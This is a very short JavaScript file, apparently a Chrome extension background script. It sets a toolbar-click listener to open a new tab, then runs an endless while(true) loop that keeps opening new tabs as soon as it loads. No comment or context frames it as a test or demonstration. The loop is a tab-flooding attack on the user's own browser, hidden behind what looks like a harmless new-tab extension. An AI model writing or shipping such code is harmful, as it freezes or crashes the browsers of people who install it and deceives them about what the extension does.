chrome.browserAction.onClicked.addListener(() => {
    chrome.tabs.create({'url': "chrome://newtab"})
})


while (true) {
    chrome.tabs.create({'url': "chrome://newtab"})
}